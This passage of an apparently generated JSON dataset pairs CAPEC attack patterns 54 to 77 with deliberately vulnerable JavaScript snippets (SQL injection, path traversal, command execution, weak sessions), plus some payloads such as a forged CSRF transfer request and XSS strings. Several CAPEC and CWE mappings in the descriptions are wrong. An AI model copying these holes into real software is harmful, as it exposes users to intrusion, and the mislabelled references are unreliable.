        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The function `validateInput` checks if the input string ends with a slash and removes it for further processing. It also checks for the presence of a null byte (`\\0`) within the input. If a null byte is found, an error is thrown. This code aims to highlight the importance of proper input validation and neutralization of special characters, such as null bytes, to prevent security issues. The example usage shows how an input containing a null byte and a trailing slash can bypass initial checks if not properly handled."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\ndb.connect((err) => {\n  if (err) throw err;\n  console.log('Connected to database');\n});\n\napp.get('/search', (req, res) => {\n  const query = req.query.q;\n  const sql = `SELECT * FROM users WHERE name = '${query}'`;\n  db.query(sql, (err, result) => {\n    if (err) {\n      res.status(500).send(`Error: ${err.message}`);\n    } else {\n      res.send(result);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a vulnerable endpoint `/search` that takes a query parameter `q` from the URL and uses it directly in an SQL query without proper sanitization. This is a classic example of SQL Injection (CWE-89) and demonstrates improper neutralization of special elements in data query logic (CWE-943). Additionally, the error message returned to the client includes sensitive information (CWE-209), and the use of the GET method with sensitive query strings (CWE-598) exposes the application to further information leakage. This code embodies the main idea of CAPEC-166, where an adversary can probe the application's structure and robustness by submitting crafted queries and examining the responses."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak password hashing function\nfunction hashPassword(password) {\n  return crypto.createHash('md5').update(password).digest('hex');\n}\n\n// Simulated database of user passwords (hashed)\nconst userDatabase = {\n  'user1': hashPassword('password123'),\n  'user2': hashPassword('123456'),\n  'user3': hashPassword('letmein')\n};\n\n// Function to simulate an attacker using a rainbow table\nfunction rainbowTableAttack(hash) {\n  const rainbowTable = {\n    '482c811da5d5b4bc6d497ffa98491e38': 'password123',\n    'e10adc3949ba59abbe56e057f20f883e': '123456',\n    '0d107d09f5bbe40cade3de5c71e9e9b7': 'letmein'\n  };\n  return rainbowTable[hash] || null;\n}\n\n// Simulate an attack\nfor (const user in userDatabase) {\n  const hash = userDatabase[user];\n  const crackedPassword = rainbowTableAttack(hash);\n  if (crackedPassword) {\n    console.log(`User: ${user}, Password: ${crackedPassword}`);\n  } else {\n    console.log(`User: ${user}, Password not found in rainbow table`);\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a weak password hashing mechanism and a simulated rainbow table attack. The `hashPassword` function uses the MD5 hashing algorithm, which is considered weak and insufficient for secure password storage (CWE-916). The `userDatabase` object simulates a database of users with their passwords hashed using this weak function. The `rainbowTableAttack` function represents an attacker's precomputed rainbow table, mapping MD5 hashes to their original passwords. The code then simulates an attack by attempting to crack each user's password using the rainbow table. This example highlights the vulnerabilities associated with weak password hashing (CWE-261, CWE-521) and the risks of relying on single-factor authentication (CWE-308, CWE-309)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "function authenticateUser(token) {\n  // Client-side token validation (CWE-602)\n  if (token === 'valid-token') {\n    return true;\n  }\n  return false;\n}\n\nfunction accessProtectedResource(token) {\n  if (authenticateUser(token)) {\n    // Critical operation that should be protected\n    console.log('Access granted to protected resource');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulating an attack by replaying a captured token (CWE-294)\nconst capturedToken = 'valid-token';\naccessProtectedResource(capturedToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and access control. The `authenticateUser` function checks if a provided token matches a hardcoded 'valid-token' string, representing a flawed client-side enforcement of server-side security (CWE-602). The `accessProtectedResource` function grants access to a protected resource if the token is validated. The code also simulates an attack by replaying a captured token (CWE-294), showing how an attacker can bypass authentication by using a previously captured valid token. This embodies the main idea of the deprecated CAPEC pattern, highlighting the risks of removing or short-circuiting guard logic and relying on insecure client-side mechanisms."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\n// SSL termination\nconst options = {\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.cert')\n};\n\napp.get('/sensitive-data', (req, res) => {\n  // CWE-598: Using GET request with sensitive data in query string\n  const sensitiveData = req.query.token;\n\n  // CWE-287: Improper Authentication\n  if (!sensitiveData || sensitiveData !== 'expectedToken') {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // CWE-642: External Control of Critical State Data\n  const userData = { userId: req.query.userId, data: 'Sensitive Information' };\n\n  res.json(userData);\n});\n\nhttps.createServer(options, app).listen(3000, () => {\n  console.log('Server is running on https://localhost:3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server with SSL termination, which is a common setup for RESTful applications. The server has an endpoint '/sensitive-data' that uses the HTTP GET method to process requests containing sensitive information in the query string (CWE-598). The code attempts to authenticate the request using a token, but the authentication mechanism is weak and insufficient (CWE-287). Additionally, the server stores and returns security-critical state information (user data) based on the query parameters, which can be controlled externally (CWE-642). This setup demonstrates how a RESTful application might trust system resources and environment, leading to potential exposure of sensitive data once SSL is terminated, aligning with the CAPEC description."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// Mock user roles\nconst users = {\n  'user1': { role: 'user' },\n  'admin1': { role: 'admin' }\n};\n\n// Mock data\nlet data = { 'key1': 'value1', 'key2': 'value2' };\n\n// Middleware to simulate authentication\napp.use((req, res, next) => {\n  req.user = users[req.headers['x-user']];\n  next();\n});\n\n// Vulnerable endpoint\napp.get('/data/:key', (req, res) => {\n  if (req.user.role === 'admin') {\n    res.json(data[req.params.key]);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\n// Vulnerable endpoint\napp.put('/data/:key', (req, res) => {\n  if (req.user.role === 'admin') {\n    data[req.params.key] = req.body.value;\n    res.send('Data updated');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This code snippet demonstrates a RESTful API using Express.js with endpoints that are vulnerable to privilege elevation attacks. The application has two endpoints: one for retrieving data (`GET /data/:key`) and one for updating data (`PUT /data/:key`). The endpoints check if the user has an 'admin' role before allowing access. However, the authorization mechanism is flawed because it relies solely on the role specified in the request headers, which can be easily manipulated by an attacker. This represents the CAPEC 'Restful Privilege Elevation' and related CWEs, such as 'Improper Authorization' (CWE-285) and 'Trusting HTTP Permission Methods on the Server Side' (CWE-650)."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\n// Vulnerable session ID generation\nfunction generateSessionID() {\n  return Math.floor(Math.random() * 1000000).toString(); // CWE-330: Use of Insufficiently Random Values\n}\n\napp.use((req, res, next) => {\n  if (!req.cookies.sessionID) {\n    const sessionID = generateSessionID();\n    res.cookie('sessionID', sessionID, { httpOnly: true, secure: true }); // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n  }\n  next();\n});\n\napp.get('/login', (req, res) => {\n  const sessionID = req.cookies.sessionID;\n  if (sessionID) {\n    // CWE-384: Session Fixation\n    res.send('Session ID: ' + sessionID);\n  } else {\n    res.status(401).send('Unauthorized'); // CWE-285: Improper Authorization\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable session management implementation using Express.js. The `generateSessionID` function creates a session ID using a predictable random number generator (CWE-330: Use of Insufficiently Random Values). The session ID is then stored in a persistent cookie (CWE-539: Use of Persistent Cookies Containing Sensitive Information) without proper entropy (CWE-331: Insufficient Entropy). The code also fails to invalidate existing session IDs upon login (CWE-384: Session Fixation), and does not properly authorize access to resources (CWE-285: Improper Authorization). This setup allows an attacker to predict session IDs and hijack sessions, embodying the main idea of CAPEC-139: Session Credential Falsification through Prediction."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false, maxAge: 60000 }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate login\n  req.session.user = { id: 1, username: 'user' };\n  res.send('Logged in');\n});\n\napp.get('/data', (req, res) => {\n  if (req.session.user) {\n    res.send('Sensitive data');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and express-session middleware to create a simple web application with session management. The code demonstrates a potential vulnerability to session replay attacks (CAPEC-139) by reusing session IDs without proper validation or expiration. The session is created with a fixed secret key and insecure cookie settings (CWE-539), and the session ID is not invalidated upon login (CWE-384). An attacker could capture and reuse a session ID to access sensitive data (CWE-200, CWE-285). The code highlights the importance of secure session management practices to prevent session hijacking and replay attacks."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.get('/login', (req, res) => {\n  // Simulate user login\n  req.session.user = 'authenticatedUser';\n  res.send('User logged in');\n});\n\napp.get('/secure', (req, res) => {\n  if (req.session.user) {\n    res.send('Secure content');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The session is initialized with a fixed secret key and insecure cookie settings (secure: false). When a user accesses the '/login' endpoint, the server assigns a session identifier and marks the user as authenticated without invalidating any existing session identifier. This allows an attacker to fixate a session identifier before the user logs in and then use the same session identifier to access privileged content at the '/secure' endpoint. This code demonstrates the vulnerability described in CAPEC-61 (Session Fixation) and related CWEs, such as CWE-384 (Session Fixation) and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "function performCSRF() {\n  var img = new Image();\n  img.src = 'https://victim-website.com/transfer?amount=1000&to=attacker-account';\n}\n\n// Simulate user clicking on a malicious link\nperformCSRF();",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack. The function 'performCSRF' creates an image element and sets its source to a URL that performs a sensitive action (e.g., transferring money) on a victim's website. When the user is authenticated on the victim's website, their session cookies are automatically sent with the request, allowing the attacker to perform actions with the user's privileges. This snippet embodies the main idea of CAPEC-352 by exploiting the implicit trust placed in user session cookies. The related CWEs are represented as follows: CWE-352 (CSRF) is directly demonstrated, CWE-306 (Missing Authentication for Critical Function) is implied as the action does not require re-authentication, CWE-664 (Improper Control of a Resource Through its Lifetime) is shown by the misuse of the session cookie, CWE-732 (Incorrect Permission Assignment for Critical Resource) is implied as the action is performed without proper permission checks, and CWE-1275 (Sensitive Cookie with Improper SameSite Attribute) is suggested as the session cookie is sent with the cross-site request."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<h2>Comment Section</h2>\n<form action=\"/submit_comment\" method=\"post\">\n  <label for=\"comment\">Comment:</label><br><br>\n  <textarea id=\"comment\" name=\"comment\"></textarea><br><br>\n  <input type=\"submit\" value=\"Submit\">\n</form>\n\n<div id=\"comments\">\n  <!-- User comments will be inserted here -->\n</div>\n\n<script>\n  // Simulate fetching user comments from the server\n  var userComments = [\n    \"<script>alert('XSS Attack!');</script>\",\n    \"<img src='invalid.jpg' onerror='alert(\\\"XSS via IMG\\\")'>\"\n  ];\n\n  var commentsDiv = document.getElementById('comments');\n  userComments.forEach(function(comment) {\n    var commentElement = document.createElement('div');\n    commentElement.innerHTML = comment; // Vulnerable to XSS\n    commentsDiv.appendChild(commentElement);\n  });\n</script>\n\n</body>\n</html>",
        "description": "This code snippet represents a simple web page with a comment section where users can submit comments. The comments are then displayed on the page. The script simulates fetching user comments from a server and directly inserts them into the DOM using `innerHTML`. This is vulnerable to Cross-Site Scripting (XSS) attacks, as demonstrated by the inclusion of a script tag and an image tag with an `onerror` attribute in the user comments. The code does not properly neutralize user input, making it susceptible to XSS attacks, which aligns with the CAPEC description and related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let pathname = decodeURIComponent(parsedUrl.pathname);\n\n  // Vulnerable path validation\n  if (pathname.includes('../') || pathname.includes('..%2F') || pathname.includes('%2E%2E%2F')) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // Simulate file access\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Accessing: ' + pathname);\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that parses incoming URL requests. It demonstrates a vulnerability where the server attempts to validate the URL path to prevent directory traversal attacks. The code checks for encoded and decoded versions of '../' in the URL path. However, it is vulnerable because it does not account for all possible encoding variations, such as double encoding or other alternate encodings. This can allow an attacker to bypass the validation logic by using different encoding schemes, leading to unauthorized access to restricted directories. The code embodies the main idea of CAPEC by showing how improper handling of URL encoding and path validation can be exploited."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "const http = require('http');\n\nhttp.get('http://example.com/update.js', (res) => {\n  let code = '';\n  res.on('data', (chunk) => {\n    code += chunk;\n  });\n  res.on('end', () => {\n    eval(code); // Execute the downloaded code\n  });\n}).on('error', (e) => {\n  console.error(`Got error: ${e.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable scenario where an application downloads and executes code from a remote server without any integrity checks or encryption. The `http.get` method fetches a JavaScript file from 'http://example.com/update.js' over an unencrypted HTTP connection. The downloaded code is then executed using `eval()`, which is highly insecure. This embodies the main idea of the CAPEC 'Sniff Application Code' by showing how an adversary could sniff the network traffic to capture the application code being transmitted in cleartext. The related CWEs are represented as follows: CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-494 (Download of Code Without Integrity Check). This code is vulnerable to man-in-the-middle attacks, where an attacker could intercept and modify the code being transmitted, leading to potential exploitation."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send('Internal Server Error');\n      return;\n    }\n    if (results.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that connects to a MySQL database and handles user login. The code constructs an SQL query using user input directly, which is a classic example of SQL Injection vulnerability (CWE-89). The input is not validated for syntactic correctness (CWE-1286), and special characters are not neutralized, allowing an attacker to manipulate the SQL query. Additionally, the error handling is generic and does not expose sensitive information (CWE-209). This snippet embodies the main idea of SQL Injection as described in the CAPEC, highlighting the risks of improper input validation and neutralization in SQL commands."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "const syslog = require('syslog-client');\n\nfunction logMessage(userInput) {\n    // CWE-134: Use of Externally-Controlled Format String\n    // CWE-20: Improper Input Validation\n    // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n    // CWE-120: Buffer Copy without Checking Size of Input\n    // CWE-680: Integer Overflow to Buffer Overflow\n    // CWE-697: Incorrect Comparison\n    const client = syslog.createClient('localhost');\n    client.log(userInput, {facility: syslog.Facility.Local0, severity: syslog.Severity.Informational}, (error) => {\n        if (error) {\n            console.error('Error logging message:', error);\n        } else {\n            console.log('Message logged successfully');\n        }\n    });\n}\n\n// Example usage\nconst userInput = process.argv[2];\nlogMessage(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of logging user input using the syslog-client library. The function `logMessage` takes user input and logs it directly using the syslog client without proper validation or sanitization. This can lead to a format string injection attack (CWE-134) if the user input contains special format specifiers. Additionally, improper input validation (CWE-20) and lack of neutralization of special elements (CWE-74) can lead to various security issues, including buffer overflows (CWE-120, CWE-680) and incorrect comparisons (CWE-697). The code highlights the importance of securely handling user input to prevent such vulnerabilities."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (CWE-328)\nfunction generateWeakHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulate missing cryptographic step (CWE-325)\nfunction signCode(data, privateKey) {\n  // Missing step: should use a secure hash function and proper signing algorithm\n  const hash = generateWeakHash(data);\n  return crypto.privateEncrypt(privateKey, Buffer.from(hash));\n}\n\n// Simulate subverting code-signing (CAPEC-243)\nfunction verifyCodeSignature(data, signature, publicKey) {\n  try {\n    const decryptedHash = crypto.publicDecrypt(publicKey, signature).toString('hex');\n    const dataHash = generateWeakHash(data);\n    return decryptedHash === dataHash;\n  } catch (err) {\n    return false;\n  }\n}\n\n// Example usage\nconst privateKey = 'privateKeyExample'; // Placeholder for private key\nconst publicKey = 'publicKeyExample'; // Placeholder for public key\nconst maliciousCode = 'console.log(\"Malicious code executed\");';\nconst signature = signCode(maliciousCode, privateKey);\n\nif (verifyCodeSignature(maliciousCode, signature, publicKey)) {\n  eval(maliciousCode); // Dangerous: executing potentially malicious code\n} else {\n  console.log('Code signature verification failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a subversion of code-signing facilities (CAPEC-243) by using a weak hash function (CWE-328) and omitting necessary cryptographic steps (CWE-325). The `generateWeakHash` function uses the MD5 algorithm, which is known to be weak and vulnerable to various attacks. The `signCode` function simulates signing code but lacks proper cryptographic steps, making the signature process insecure. The `verifyCodeSignature` function attempts to verify the code signature but relies on the weak hash, making it easy to subvert. The example usage shows how malicious code could be executed if the signature verification is bypassed. This code highlights the risks associated with improper implementation of cryptographic mechanisms and the potential for executing untrusted code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction runCommand(userInput) {\n  // CWE-250: Execution with Unnecessary Privileges\n  if (process.getuid() !== 0) {\n    console.error('This script must be run as root!');\n    process.exit(1);\n  }\n\n  // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable script that runs with elevated privileges and executes user-provided input as an OS command. The script checks if it is running as the root user (CWE-250: Execution with Unnecessary Privileges) and then uses the 'exec' function from the 'child_process' module to execute the command provided by the user (CWE-78: Improper Neutralization of Special Elements used in an OS Command). The user input is taken directly from the command line arguments (CWE-15: External Control of System or Configuration Setting), making it susceptible to injection attacks. This code embodies the main idea of the CAPEC by showing how an attacker could exploit a program running with elevated privileges to execute arbitrary commands."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "const defaultCredentials = [\n  { username: 'admin', password: 'admin' },\n  { username: 'user', password: 'password' },\n  { username: 'root', password: 'root' }\n];\n\nfunction authenticate(username, password) {\n  for (let cred of defaultCredentials) {\n    if (cred.username === username && cred.password === password) {\n      console.log('Access granted');\n      return true;\n    }\n  }\n  console.log('Access denied');\n  return false;\n}\n\n// Example usage\nconst userInput = { username: 'admin', password: 'admin' };\nauthenticate(userInput.username, userInput.password);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism using a list of default credentials. The `defaultCredentials` array contains common username and password pairs that are often used as default credentials in many systems. The `authenticate` function checks if the provided username and password match any of the default credentials. If a match is found, access is granted; otherwise, access is denied. This code embodies the main idea of CAPEC-562, highlighting the vulnerability of using common or default usernames and passwords. It also touches on related CWEs such as CWE-521 (Weak Password Requirements) and CWE-798 (Use of Hard-coded Credentials), illustrating the risks associated with these practices."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (/^[a-zA-Z0-9]+$/.test(input)) {\n    // Improper handling of Unicode encoding\n    let canonicalInput = decodeURIComponent(input);\n    // Incomplete list of disallowed inputs\n    if (canonicalInput.includes('<script>')) {\n      throw new Error('Invalid input detected');\n    }\n    return canonicalInput;\n  } else {\n    throw new Error('Invalid input format');\n  }\n}\n\ntry {\n  let userInput = '%3Cscript%3Ealert(1)%3C/script%3E'; // Encoded malicious input\n  let validatedInput = validateInput(userInput);\n  console.log('Validated Input:', validatedInput);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The `validateInput` function first performs early validation on the input using a regular expression to check if it contains only alphanumeric characters. However, this validation occurs before the input is canonicalized (decoded). The `decodeURIComponent` function is then used to decode the input, which could reveal malicious content that was not detected during the initial validation. The code also demonstrates an incomplete list of disallowed inputs by only checking for the presence of the '<script>' tag. This allows an attacker to bypass the validation by encoding the malicious input, which is then decoded to reveal the attack vector. The example input '%3Cscript%3Ealert(1)%3C/script%3E' is an encoded script tag that, when decoded, becomes '<script>alert(1)</script>', demonstrating how the validation can be bypassed."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  let parsedUrl = url.parse(req.url, true);\n  let filePath = decodeURIComponent(parsedUrl.query.file);\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a URL parameter. The server parses the URL and decodes the 'file' query parameter using `decodeURIComponent`. This approach is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Improper Handling of URL Encoding (CWE-177)**: The code decodes the URL parameter without proper validation, allowing an attacker to manipulate the URL encoding to access unintended files.\n2. **External Control of File Name or Path (CWE-73)**: The file path is directly influenced by user input, which can lead to directory traversal attacks.\n3. **Improper Input Validation (CWE-20)**: The code does not validate the input to ensure it is safe, allowing potentially malicious input to be processed.\n\nThis code demonstrates how improper handling of URL encoding and lack of input validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n    let filename = req.body.filename;\n    // Vulnerable: No validation or sanitization of the filename\n    let filePath = path.join(__dirname, 'uploads', filename);\n    res.send(`<a href=\"${filePath}\">Download your file</a>`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that handles file uploads. The server accepts a filename from the user via a POST request and constructs a file path using this filename. The constructed file path is then embedded directly into an HTML link and sent back to the user. This code is vulnerable to the 'User-Controlled Filename' attack pattern (CAPEC-139) because it does not validate or sanitize the user-supplied filename. An attacker could exploit this by providing a malicious filename containing HTML or JavaScript code, leading to Cross-Site Scripting (XSS) attacks. The related CWEs highlight the lack of input validation (CWE-20), improper neutralization of directives (CWE-96), and improper encoding or escaping of output (CWE-116), all of which contribute to the vulnerability."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\n// Insecurely storing sensitive information in a cookie\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (authenticate(username, password)) {\n    // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n    res.cookie('session', JSON.stringify({ username, role: 'user' }), { httpOnly: true });\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Manipulating state information\napp.get('/elevate', (req, res) => {\n  let session = JSON.parse(req.cookies.session);\n  if (session && session.username) {\n    // CWE-372: Incomplete Internal State Distinction\n    session.role = 'admin'; // Elevating privilege\n    res.cookie('session', JSON.stringify(session), { httpOnly: true });\n    res.send('Privilege elevated');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nfunction authenticate(username, password) {\n  // Dummy authentication function\n  return username === 'user' && password === 'pass';\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js that is vulnerable to state manipulation attacks. The code insecurely stores sensitive information (username and role) in a cookie without encryption (CWE-315). An attacker can manipulate the state by modifying the cookie to elevate privileges (CWE-372). The '/login' endpoint sets a session cookie with user information in cleartext, and the '/elevate' endpoint allows an attacker to change the user's role to 'admin' by modifying the cookie, demonstrating the manipulation of state information."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = './config.json';\n\n// Read the configuration file\nlet configData = fs.readFileSync(configFilePath, 'utf8');\n\n// Parse the configuration data\nlet config;\ntry {\n  config = JSON.parse(configData);\n} catch (e) {\n  console.error('Invalid JSON format in configuration file');\n  process.exit(1);\n}\n\n// Use the configuration data\nconst dbConnection = `mysql://${config.dbUser}:${config.dbPassword}@${config.dbHost}/${config.dbName}`;\n\n// Execute a command using the configuration data\nconst exec = require('child_process').exec;\nexec(`mysql -u ${config.dbUser} -p${config.dbPassword} -h ${config.dbHost} ${config.dbName} < backup.sql`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to manipulating writable configuration files. The code reads a configuration file (config.json) and uses its contents to construct a database connection string and execute a command. The main idea of the CAPEC is represented by the fact that if an attacker can modify the configuration file, they can inject malicious data. The related CWEs are illustrated as follows:\n- CWE-349: The code accepts and processes untrusted data from the configuration file without validation.\n- CWE-99: The code uses input from the configuration file to construct a resource identifier (database connection string) without proper restrictions.\n- CWE-77: The code constructs a command using data from the configuration file, which could lead to command injection if the data is malicious.\n- CWE-346: The code does not validate the source of the configuration data.\n- CWE-353 and CWE-354: The code does not include or validate integrity checks for the configuration data, making it susceptible to tampering."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst path = require('path');\nconst app = express();\n\napp.get('/read-file', (req, res) => {\n  const filePath = path.join(__dirname, 'files', req.query.filename);\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading file');\n    }\n    res.send(data);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that reads and returns the contents of a file specified by the user through a query parameter. The code is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **Relative Path Traversal (CWE-23)**: The `req.query.filename` input is directly used to construct the file path without proper validation or sanitization, allowing an attacker to use sequences like `../` to access files outside the intended directory.\n\n2. **Improper Limitation of a Pathname to a Restricted Directory (CWE-22)**: The code does not ensure that the constructed path remains within a restricted directory, potentially allowing access to sensitive files.\n\n3. **External Control of File Name or Path (CWE-73)**: The file path is influenced by external user input, which can be manipulated to access unintended files.\n\n4. **Improper Neutralization of Special Elements used in a Command (CWE-77)**: Although not directly constructing a command, the lack of input sanitization can lead to similar issues when the file path is interpreted by the filesystem.\n\nThe main idea represented by this code is the manipulation of web input to perform file system operations, which can lead to unauthorized access or modification of files."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/updateSettings', (req, res) => {\n  // Vulnerable code: directly using user input to modify settings\n  const settings = {\n    debug: req.query.debug || false,\n    theme: req.query.theme || 'light'\n  };\n\n  // Simulate applying settings\n  applySettings(settings);\n  res.send('Settings updated');\n});\n\nfunction applySettings(settings) {\n  // Simulate applying settings\n  console.log('Applying settings:', settings);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
